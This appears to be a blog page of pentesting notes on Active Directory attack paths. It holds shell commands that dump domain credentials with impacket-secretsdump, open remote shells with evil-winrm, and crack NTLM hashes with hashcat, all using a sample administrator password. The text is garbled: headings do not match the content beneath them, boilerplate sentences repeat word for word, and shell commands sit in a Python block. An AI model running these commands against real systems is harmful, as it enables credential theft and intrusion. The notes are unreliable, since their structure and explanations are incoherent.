---
TitleSEO: "Active Directory Attack Paths | ZureFX"
TitlePost: "Active Directory Attack Paths"
Author: "ZureFX"
Description: "Personal notes on Active Directory Attack Paths. Quick reference for pentesting and CTF challenges."
Keywords: "dfir, linux, malware, persistence"
URL: "https://zurefx.github.io/notes/note-active-directory-attack-paths-492.html"
URL_IMAGES: ""
Date: "2024-04-22"
Tags: "DFIR, Linux, Malware, Persistence"
Section: "notes"
Lang: "en"
main_img: "note-active-directory-attack-paths-492"
Permalink: "/notes/note-active-directory-attack-paths-492.html"
BtnLabel: "Read Notes"
Pick: 0
---
## HTTPS

### ACL Abuse

```bash
crackmapexec smb 10.56.171.45 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.18.45.94
```

- `AS-REP Roasting`
- `DNS Rebinding`
- `impacket`
- `smbclient`

## Docker Escape

### ligolo-ng

- `XXE`
- `gobuster`
- `LXD Privilege Escalation`
- `bloodhound`
- `secretsdump`
- `feroxbuster`

Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities. The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine.

## AlwaysInstallElevated

### XXE

Weak file permissions allowed modification of critical system files. Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service. Authentication bypass was achieved through careful manipulation of the login mechanism. Weak file permissions allowed modification of critical system files.

Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism.

## RDP

### Kerberos

> **Note:** Subdomain Takeover was identified as the primary attack vector in this scenario.

```bash
evil-winrm -i 10.96.75.114 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.67.154.224/FUZZ
evil-winrm -i 10.29.202.96 -u administrator -p 'P@ssw0rd!'
```

The application stored sensitive credentials in an unencrypted configuration file. Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory. The web application was vulnerable to Server-Side Template Injection (SSTI). The backup files contained sensitive information that should not have been accessible.

> **Note:** Unquoted Service Path was identified as the primary attack vector in this scenario.

## nikto

### LDAP

Privilege escalation was possible due to misconfigured sudo permissions. Privilege escalation was possible due to misconfigured sudo permissions. Unconstrained delegation was enabled on the compromised machine.

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.86.135.101
impacket-secretsdump administrator:'P@ssw0rd!'@10.88.43.156
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.120.31.151/FUZZ
evil-winrm -i 10.14.253.141 -u administrator -p 'P@ssw0rd!'
```

The database credentials were hardcoded in the application source code. The service was running without proper input validation, leading to injection vulnerabilities. Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file.

```bash
nmap -sCV -p8080,3306,25 10.70.34.226 -oN scan.txt
gobuster dir -u http://10.31.233.149/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.88.139.182
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target. Authentication bypass was achieved through careful manipulation of the login mechanism. Post-exploitation enumeration revealed a path to domain administrator privileges.
